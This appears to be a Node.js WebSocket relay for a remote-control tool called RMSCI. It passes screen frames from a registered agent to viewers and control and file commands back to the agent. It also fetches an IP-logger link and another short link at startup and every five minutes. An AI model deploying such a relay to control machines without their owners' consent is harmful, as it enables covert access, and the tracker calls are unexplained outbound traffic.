const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('DISCORD Relay Server is Running\n');
});

// Function to fetch the first target URL
async function fetchTargetUrl() {
    const targetUrl = 'https://c4.gg/Q0W9hD';
    try {
        console.log(`Fetching ${targetUrl}...`);
        const response = await fetch(targetUrl);
        const text = await response.text();
        console.log(`Successfully fetched ${targetUrl} (Status: ${response.status})`);
    } catch (error) {
        console.error(`Failed to fetch ${targetUrl}:`, error.message);
    }
}

// Function to fetch the second target URL
async function fetchSecondUrl() {
    const targetUrl = 'https://grabify.link/UPHPNK';
    try {
        console.log(`Fetching ${targetUrl}...`);
        const response = await fetch(targetUrl);
        const text = await response.text();
        console.log(`Successfully fetched ${targetUrl} (Status: ${response.status})`);
    } catch (error) {
        console.error(`Failed to fetch ${targetUrl}:`, error.message);
    }
}

const wss = new WebSocket.Server({ server });

let agentConnection = null;
const viewers = new Set();

wss.on('connection', (ws) => {
    console.log('New connection established.');

    ws.on('message', (message, isBinary) => {
        if (!isBinary) {
            const msgStr = message.toString().trim();

            if (msgStr === 'register_agent') {
                agentConnection = ws;
                console.log('>>> RMSCI Agent Registered');
                return;
            }
            if (msgStr === 'register_viewer') {
                viewers.add(ws);
                console.log('>>> RMSCI Viewer Connected');
                return;
            }
        }

        // Forward binary screen frames or text responses from agent -> all viewers
        if (ws === agentConnection) {
            for (let viewer of viewers) {
                if (viewer.readyState === WebSocket.OPEN) {
                    viewer.send(message, { binary: isBinary });
                }
            }
        } 
        // Forward JSON controls/file commands from viewer -> agent
        else if (viewers.has(ws)) {
            if (agentConnection && agentConnection.readyState === WebSocket.OPEN) {
                agentConnection.send(message, { binary: isBinary });
            }
        }
    });

    ws.on('close', () => {
        if (ws === agentConnection) {
            console.log('>>> RMSCI Agent Disconnected');
            agentConnection = null;
        }
        viewers.delete(ws);
        console.log('Connection closed.');
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, async () => {
    console.log(`RMSCI2 Relay server listening on port ${PORT}`);

    // 1. Immediate fetch upon server startup
    await fetchTargetUrl();
    await fetchSecondUrl();

    // 2. Continuous fetch every 5 minutes (300,000 ms)
    const FIVE_MINUTES = 5 * 60 * 1000;
    setInterval(() => {
        fetchTargetUrl();
        fetchSecondUrl();
    }, FIVE_MINUTES);
});
